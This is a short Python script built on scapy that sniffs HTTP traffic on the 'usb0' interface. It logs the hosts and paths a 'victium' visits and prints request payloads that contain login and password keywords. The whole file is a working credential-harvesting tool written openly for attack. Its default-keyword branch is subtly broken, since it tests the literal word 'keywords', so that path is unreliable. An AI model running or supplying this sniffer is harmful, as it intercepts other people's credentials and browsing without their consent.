import scapy.all as scapy
from scapy.layers import http
import optparse

def arguments():
    parser = optparse.OptionParser()
    parser.add_option("--l","--list",dest="keywords",help="Search keywords in list")
    parser.add_option("--v","--vist",action="store_true",dest="vist_arg",help="See any sites victium visit")
    optoins,arg = parser.parse_args()
    return optoins

options = arguments()
def sniff(network_interface):
    print("[log] started waiting for http request")
    scapy.sniff(iface=network_interface,store=False ,prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        vist = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            if options.vist_arg:
                print(f"[log] request >> [ {vist} ]")
            if options.keywords:
                with open(options.keywords,'r') as file:
                    for line in file:
                        if line.strip() in str(load):
                            print(f"[+] Match :  {load} | request >>[ {vist} ]")
                            break
            else:
                print("[log] Start Search on defult keywords..")
                keywords = ["username" , "user" , "login" , "name" , "acces", "password","pass"]
                for keywords in keywords:
                    if "keywords" in str(load):
                        print(load)
                        break



sniff("usb0")
